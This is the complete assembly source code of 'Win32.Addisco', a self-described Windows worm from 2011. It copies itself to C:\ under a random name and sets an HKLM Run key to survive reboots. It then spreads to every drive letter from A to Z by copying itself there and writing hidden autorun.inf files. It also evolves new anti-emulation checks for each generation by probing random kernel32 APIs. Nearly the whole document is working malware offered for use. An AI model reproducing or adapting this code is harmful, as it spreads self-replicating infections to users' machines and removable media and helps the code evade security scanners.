;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;
;;  Win32.Addisco
;;  by SPTH
;;  October 2011
;;
;;
;;  This is a worm which spreads via network/removable/USB drives.
;;
;;  The special thing is that it is able to find and implement
;;  new Anti-Emulation tricks autonomously.
;;
;;  This is done via analysing the undocumented leftover values in ECX
;;  and EDX after an random Windows API call. The API is analysed in
;;  a Black-Box test - if for a given set of parameters a constant
;;  ECX+EDX value is found, a new Anti-Emulation trick is created for
;;  the next generation.
;;
;;  The worm is aware of "Address Space Layout Randomization" (ASLR).
;;
;;  More details can be found in an article "Dynamic Anti-Emulation
;;  using Blackbox Analysis".
;;
;;  This analyse of the environment and autonomous developement of new
;;  self-defending trick seems to be a simple form of machine learning. :-)
;;
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;



include 'E:\Programme\FASM\INCLUDE\win32ax.inc'

.data
	constFileSize  EQU 0x1000
	constCodeStart EQU 0x0400

	hMyFileName dd 0x0
	hFileHandle dd 0x0
	hMapHandle  dd 0x0
	hMapViewAddress dd 0x0

	hVEH	   dd 0x0
	bException dd 0x0
	sESP	   dd 0x0
	s2ESP	   dd 0x0


	RandomNumber	dd 0x0
	RandOrdinal	dd 0x0

	RndFctAddress	      dd 0x0
	RndFctArguments       dd 0x0

	rept 0x10 c
	{
		RndFctArg#c dd 0x0
	}

	RndFct_RV_ECX	dd 0x0
	RndFct_RV_EDX	dd 0x0


	kernel32	db "kernel32.dll",0x0
	hKernel 	dd 0x0
	nOSVersion	dd 0x0

	SpaceForHDC:	   dd 0x0   ; should be 0x0, C:\
	RandomFileName: times 13 db 0x0

	SpaceForHDC2:	   dd 0x0   ; should be 0x0, X:\
	RandomFileName2:times 13 db 0x0

	stKey: times 47 db 0x0 ; "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0x0
	hKey  dd 0x0

	stAutoRunContent: times 52 db 0x0

	stAutorunWithDrive db 0x0, 0x0, 0x0	; "X:\"
	stAutoruninf: times 12 db 0x0		; "autorun.inf"

	hCreateFileAR	     dd 0x0
	hCreateFileMappingAR dd 0x0



macro VEH_TRY c*
{
	mov	dword[sESP], esp

	push	VEH_Handler#c
	push	0x1
	stdcall dword[AddVectoredExceptionHandler]
	mov	dword[hVEH], eax
}

macro VEH_EXCEPTION c*
{
	mov	dword[bException], 0x0
	jmp	VEH_NoException#c

     VEH_Handler#c:
	mov	esp, dword[sESP]
	mov	dword[bException], 0x1
}

macro VEH_END c*
{
     VEH_NoException#c:
	mov	eax, dword[hVEH]
	push	eax
	stdcall dword[RemoveVectoredExceptionHandler]
}

.code
start:
	stdcall dword[GetVersion]
	cmp	eax, 0x0A280105 	; Version here
	jne	StartEngine		; WrongVersion of OS

	push	kernel32
	stdcall dword[LoadLibrary]

	add	eax, 0x1234'5678

	times (0x10*5 + 2 + 6 + 2 + 1): nop  ; 0x10*push + call + cmp + je + ret


; ###########################################################################
; #####
; #####   Preparation (copy file, get kernel, ...)
; #####

StartEngine:
	stdcall dword[GetVersion]
	mov	dword[nOSVersion], eax

	push	0x8007
	stdcall dword[SetErrorMode]

	stdcall dword[GetCommandLineA]
	mov	dword[hMyFileName], eax
	cmp	byte[eax], '"'
	jne	FileNameIsFine
	inc	eax
	mov	dword[hMyFileName], eax

	FindFileNameLoop:
		inc	eax
		cmp	byte[eax], '"'
	jne	FindFileNameLoop

	mov	byte[eax], 0x0
	FileNameIsFine:


	stdcall dword[GetTickCount]
	mov	dword[RandomNumber], eax

	xor	esi, esi
	CopyFileAndRegEntryMore:
		mov	ebx, 26
		mov	ecx, 97
		call	CreateSpecialRndNumber

		mov	byte[RandomFileName+esi], dl
		inc	esi
		cmp	esi, 8
	jb	CopyFileAndRegEntryMore

	mov	eax, ".exe"
	mov	dword[RandomFileName+esi], eax

	mov	al, "C"
	mov	byte[SpaceForHDC+1], al
	mov	al, ":"
	mov	byte[SpaceForHDC+2], al
	mov	al, "\"
	mov	byte[SpaceForHDC+3], al

	push	FALSE
	push	SpaceForHDC+1
	push	dword[hMyFileName]
	stdcall dword[CopyFileA]

	push	kernel32	    ; Get Kernel32
	stdcall dword[LoadLibrary]
	cmp	eax, 0
	je	SpreadKitty

	mov	dword[hKernel], eax


; #####
; #####   Preparation (copy file, get kernel, ...)
; #####
; ###########################################################################

; ###########################################################################
; #####
; #####   call random API & save undocumented ECX&EDX
; #####


    SearchRandomAPI:
	call	GetRandomNumber
	mov	eax, dword[RandomNumber]
	and	eax, (0x40 - 1)
	jz	SpreadKitty		    ; Probabilistic quiting (1/64)

	call	GetRandomNumber
	mov	eax, dword[RandomNumber]
	and	eax, (0x400 - 1) ; 0-1023
	mov	dword[RandOrdinal], eax

	push	dword[RandOrdinal]
	push	dword[hKernel]
	stdcall dword[GetProcAddress]

	cmp	eax, 0x0
	je	SearchRandomAPI

	mov	dword[RndFctAddress], eax

	mov	dword[s2ESP], esp	; Save original ESP
	times 0x10: push 0		; PUSH 16 parameters



	VEH_TRY FirstRun
;       {
		stdcall dword[RndFctAddress]   ; try it ;)
;       }
	VEH_EXCEPTION FirstRun
;       {                                       ; no success :-/
	       mov     esp, dword[s2ESP]	; restore ESP
;       }
	VEH_END FirstRun

	cmp	dword[bException], 0x1
	je	SearchRandomAPI


	; Get Number of arguments used by this random API :)
	mov	eax, esp
	sub	eax, dword[sESP]
	shr	eax, 2			; eax/=4 -> number of arguments
	mov	dword[RndFctArguments], eax

	mov	esp, dword[s2ESP]	 ; restore ESP


	call	RandomizeArguments
	call	PushNArgumentsToStack

	VEH_TRY RealRun1
;       {
		stdcall dword[RndFctAddress]

		mov	dword[RndFct_RV_ECX], ecx
		mov	dword[RndFct_RV_EDX], edx
;       }
	VEH_EXCEPTION RealRun1
;       {
		mov	esp, dword[s2ESP]	 ; restore ESP
;       }
	VEH_END RealRun1

	cmp	dword[bException], 0x1
	je	SearchRandomAPI


	; Run again and compare ECX and EDX, just in case (Time-APIs and stuff like that, dependence on register values)
	call	PushNArgumentsToStack

	VEH_TRY RealRun2
;       {
		call	RandomizeRegisters

		stdcall dword[RndFctAddress]

		sub	ecx, dword[RndFct_RV_ECX]
		jz	RealRun2ECX_OK

			xor	eax, eax
			mov	dword[eax], 42

		RealRun2ECX_OK:
		sub	edx, dword[RndFct_RV_EDX]
		jz	RealRun2EDX_OK

			xor	eax, eax
			mov	dword[eax], 42

		RealRun2EDX_OK:
;       }
	VEH_EXCEPTION RealRun2
;       {
		mov	esp, dword[s2ESP]	 ; restore ESP
;       }
	VEH_END RealRun2

	cmp	dword[bException], 0x1
	je	SearchRandomAPI


; #####
; #####   call random API & save undocumented ECX&EDX
; #####
; ###########################################################################

; ###########################################################################
; #####
; #####   Open New File
; #####

	push	0x0
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_ALWAYS
	push	0x0
	push	0x0
	push	(GENERIC_READ or GENERIC_WRITE)
	push	SpaceForHDC+1
	stdcall dword[CreateFileA]

	cmp	eax, INVALID_HANDLE_VALUE
	je	IVF_NoCreateFile
	mov	dword[hFileHandle], eax

	push	0x0
	push	constFileSize
	push	0x0			      ; nFileSizeHigh=0 from above
	push	PAGE_READWRITE
	push	0x0
	push	dword[hFileHandle]
	stdcall dword[CreateFileMappingA]

	cmp	eax, 0x0
	je	IVF_NoCreateMap
	mov	dword[hMapHandle], eax

	push	constFileSize
	push	0x0
	push	0x0
	push	FILE_MAP_WRITE
	push	dword[hMapHandle]
	stdcall dword[MapViewOfFile]

	cmp	eax, 0x0
	je	IVF_NoMapView
	mov	dword[hMapViewAddress], eax

; #####
; #####   Open New File
; #####
; ###########################################################################

; ###########################################################################
; #####
; #####   Change Anti-Debugging API call at code start
; #####

	add	eax, constCodeStart
	mov	ebx, dword[nOSVersion]
	mov	dword[eax + 0x07], ebx		; write new OS

	mov	ebx, dword[RndFctAddress]	; Change "add eax, NNNN"
	sub	ebx, dword[hKernel]		; where NNNN=Functionaddress-Kerneladdress
	mov	dword[eax + 0x19], ebx

	mov	edi, RndFctArg1
	mov	esi, eax
	add	esi, 0x1D
	mov	ecx, dword[RndFctArguments]
	jecxz	NoFurtherPush

    MoreArgPush:
	add	edi, 0x04
	mov	byte[esi], 0x68 	 ; push
	mov	ebx, dword[edi]
	mov	dword[esi + 0x01], ebx	 ; argument
	add	esi, 0x05
	dec	ecx
    jnz MoreArgPush

    NoFurtherPush:
	mov	word[esi], 0xD0FF		; call
	add	esi, 0x2

	mov	eax, dword[RndFct_RV_ECX]
	and	eax, 0xFF00'0000
	mov	ebx, dword[hKernel]
	and	ebx, 0xFF00'0000
	cmp	eax, ebx
	je	NoECX_Kernel

	mov	dword[esi], 0x0000'F981 	; cmp ecx, NNNN
	add	esi, 0x2

	mov	ebx, dword[RndFct_RV_ECX]
	mov	dword[esi], ebx
	add	esi, 0x4			; value of ECX

	mov	dword[esi], 0x00C3'0174 	; je ... + ret
	add	esi, 0x3

    NoECX_Kernel:
	mov	eax, dword[RndFct_RV_EDX]
	and	eax, 0xFF00'0000
	mov	ebx, dword[hKernel]
	and	ebx, 0xFF00'0000
	cmp	eax, ebx
	je	NoEDX_Kernel

	mov	dword[esi], 0x0000'FA81 	; cmp ecx, NNNN
	add	esi, 0x2

	mov	ebx, dword[RndFct_RV_EDX]
	mov	dword[esi], ebx
	add	esi, 0x4			; value of EDX

	mov	dword[esi], 0x00C3'0174 	; je ... + ret
	add	esi, 0x3
    NoEDX_Kernel:

	mov	ecx, constCodeStart+(StartEngine-start)
	add	ecx, dword[hMapViewAddress]

	PaddingTheHead:
		mov	byte[esi], 0x90
		inc	esi
		cmp	esi, ecx
	jne	PaddingTheHead


; #####
; #####   Change Anti-Debugging API call at code start
; #####
; ###########################################################################

; ###########################################################################
; #####
; #####   Close New File
; #####

    IVF_CloseMapView:
	push	dword[hMapViewAddress]
	stdcall dword[UnmapViewOfFile]

    IVF_NoMapView:
	push	dword[hMapHandle]
	call	dword[CloseHandle]

    IVF_NoCreateMap:
	push	dword[hFileHandle]
	call	dword[CloseHandle]

    IVF_NoCreateFile:

; #####
; #####   Close New File
; #####
; ###########################################################################


; ###########################################################################
; #####
; #####   Spread this kitty ;)
; #####

SpreadKitty:
;  Representation of "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
;  One could permute it - but too lazy for doing this task atm :)

	mov	eax, stKey
	mov	dword[eax+0x00], "SOFT"
	mov	dword[eax+0x04], "WARE"
	mov	dword[eax+0x08], "\Mic"
	mov	dword[eax+0x0C], "roso"
	mov	dword[eax+0x10], "ft\W"
	mov	dword[eax+0x14], "indo"
	mov	dword[eax+0x18], "ws\C"
	mov	dword[eax+0x1C], "urre"
	mov	dword[eax+0x20], "ntVe"
	mov	dword[eax+0x24], "rsio"
	mov	dword[eax+0x28], "n\Ru"
	mov	byte[eax+0x2C], "n"

	push	0x0
	push	hKey
	push	0x0
	push	KEY_ALL_ACCESS
	push	REG_OPTION_NON_VOLATILE
	push	0x0
	push	0x0
	push	stKey
	push	HKEY_LOCAL_MACHINE
	stdcall dword[RegCreateKeyExA]

	push	16
	push	SpaceForHDC+1
	push	REG_SZ
	push	0x0
	push	0x0
	push	dword[hKey]
	stdcall dword[RegSetValueExA]

	push	dword[hKey]
	stdcall dword[RegCloseKey]

	xor	eax, eax
	mov	dword[stAutorunWithDrive], "X:\a"
	mov	dword[stAutorunWithDrive+2], "\aut"
	mov	dword[stAutoruninf+3], "orun"
	mov	dword[stAutoruninf+7], ".inf"

;        mov     eax, "[Aut"
	mov	dword[stAutoRunContent], "[Aut"
	mov	dword[stAutoRunContent+0x04], "orun"
	mov	dword[stAutoRunContent+0x08], 0x530A0D5D
	mov	dword[stAutoRunContent+0x0C], "hell"	   ; !!!!!!!
	mov	dword[stAutoRunContent+0x10], "Exec"
	mov	dword[stAutoRunContent+0x14],  "ute="
	mov	eax, dword[RandomFileName]	  ; Filename: XXXXxxxx.exe
	mov	dword[stAutoRunContent+0x18], eax
	mov	eax, dword[RandomFileName+0x4]	  ; Filename: xxxxXXXX.exe
	mov	dword[stAutoRunContent+0x1C], eax
	mov	dword[stAutoRunContent+0x20], ".exe"
	mov	dword[stAutoRunContent+0x24], 0x73550A0D
	mov	dword[stAutoRunContent+0x28], "eAut"
	mov	dword[stAutoRunContent+0x2C], "opla"
	mov	dword[stAutoRunContent+0x30],  0x00313D79

	; i like that coding style, roy g biv! :))
	push	51
	push	0x0
	push	0x0
	push	FILE_MAP_ALL_ACCESS
	push	0x0
	push	51
	push	0x0
	push	PAGE_READWRITE
	push	0x0
	push	0x0
	push	FILE_ATTRIBUTE_HIDDEN
	push	OPEN_ALWAYS
	push	0x0
	push	0x0
	push	(GENERIC_READ or GENERIC_WRITE)
	push	stAutoruninf

	stdcall dword[CreateFileA]
	push	eax
	mov	dword[hCreateFileAR], eax
	stdcall dword[CreateFileMappingA]
	push	eax
	mov	dword[hCreateFileMappingAR], eax
	stdcall dword[MapViewOfFile]

	xor	cl, cl
	mov	esi, stAutoRunContent
	MakeAutoRunInfoMore:
		mov	bl, byte[esi]
		mov	byte[eax], bl
		inc	eax
		inc	esi
		inc	ecx
		cmp	cl, 51
	jb	MakeAutoRunInfoMore

	sub	eax, 51
	push	dword[hCreateFileAR]
	push	dword[hCreateFileMappingAR]
	push	eax
	stdcall dword[UnmapViewOfFile]
	stdcall dword[CloseHandle]
	stdcall dword[CloseHandle]

	mov	dword[SpaceForHDC2+1], "A:\."
	mov	eax, dword[RandomFileName]
	mov	dword[RandomFileName2], eax	    ; XXXXxxxx.exe
	mov	eax, dword[RandomFileName+0x04]
	mov	dword[RandomFileName2+0x04], eax    ; xxxxXXXX.exe
	mov	eax, dword[RandomFileName+0x08]
	mov	dword[RandomFileName2+0x08], eax    ; .exe


    SpreadKittyAnotherTime:
	mov	dword[SpaceForHDC2], 0x003A4100    ; 0x0, "A:", 0x0

    STKAnotherRound:
	push	SpaceForHDC2+1
	stdcall dword[GetDriveTypeA]

	xor	ebx, ebx	; 0 ... No Drive
				; 1 ... Drive (without autorun.inf)
				; 2 ... Drive (with autorun.inf)

	mov	cl, '\'
	mov	byte[SpaceForHDC2+3],cl


;        mov     byte[DriveNumber], al
;        add     byte[DriveNumber], 0x30

	cmp	al, 0x2
	je	STKWithAutoRun

	cmp	al, 0x3
	je	STKWithoutAutoRun

	cmp	al, 0x4
	je	STKWithAutoRun

	cmp	al, 0x6
	je	STKWithAutoRun

	jmp	STKCreateEntriesForNextDrive

	STKWithAutoRun:

	push	FALSE
	push	stAutorunWithDrive
	push	stAutoruninf
	stdcall dword[CopyFileA]

	STKWithoutAutoRun:

	push	FALSE
	push	SpaceForHDC2+1
	push	SpaceForHDC+1
	stdcall dword[CopyFileA]


	STKCreateEntriesForNextDrive:
	xor	eax, eax
	mov	al, byte[SpaceForHDC2+1]
	cmp	al, "Z"
	je	SpreadThisKittyEnd

	inc	al
	mov	byte[SpaceForHDC2+1], al	; next drive
	mov	byte[stAutorunWithDrive], al	; next drive
	mov	byte[SpaceForHDC2+3], ah	; 0x0, "X:", 0x0
    jmp STKAnotherRound


    SpreadThisKittyEnd:
	call	GetRandomNumber
	mov	eax, dword[RandomNumber]
	and	eax, (0x8000 - 1)	; 0-32 sec

	push	eax
	stdcall dword[Sleep]

	call	GetRandomNumber
	mov	eax, dword[RandomNumber]
	and	eax, (0x100-1)
	jnz	SpreadKittyAnotherTime

	invoke	MessageBox, 0x0, "If you don't crack the shell, you can't eat the nut.", "Learning the joy of self-defence :-)", 0x0

jmp	SpreadKittyAnotherTime

; #####
; #####   Spread this kitty ;)
; #####
; ###########################################################################


GetRandomNumber:
	pushad
		xor	edx, edx
		mov	eax, dword[RandomNumber]

		mov	ebx, 1103515245
		mul	ebx	       ; EDX:EAX = EDX:EAX * EBX

		add	eax, 12345
		mov	dword[RandomNumber], eax
	popad
ret

CreateSpecialRndNumber:
; in: ebx, ecx
; out: edx=(rand()%ebx + ecx)

		call	GetRandomNumber

		xor	edx, edx
		mov	eax, dword[RandomNumber]
		div	ebx

		add	edx, ecx
ret

RandomizeArguments:
	pushad
		mov	ecx, 0x10
		mov	edi, RndFctArg1
		CreateArgLoop:
			call	GetRandomNumber
			mov	eax, dword[RandomNumber]
			mov	dword[edi], eax
			add	edi, 4
			dec	ecx
		jnz	CreateArgLoop
	popad

ret


RandomizeRegisters:
	call	GetRandomNumber
	mov	ecx, dword[RandomNumber]	; Randomize ECX
	call	GetRandomNumber
	mov	edx, dword[RandomNumber]	; Randomize EDX
	call	GetRandomNumber
	mov	eax, dword[RandomNumber]	; Randomize EAX (in case of some "xchg ecx|edx, Reg32")
	call	GetRandomNumber
	mov	ebx, dword[RandomNumber]	; Randomize EBX (in case of some "xchg ecx|edx, Reg32")
	call	GetRandomNumber 		; prevent the output to depent on the input registers :)
ret						; dont care about esi, edi, ebx. worst case -> no execution



PushNArgumentsToStack:
	pop	ebx		   ; return value
	mov	ecx, dword[RndFctArguments]
	cmp	ecx, 0
	je	PushNArgumentsToStackFin

	mov	edi, RndFctArg1
	PushArgs:
		push	dword[edi]
		add	edi, 4
		dec	ecx
	jnz	PushArgs

  PushNArgumentsToStackFin:
	push	ebx
ret

.end start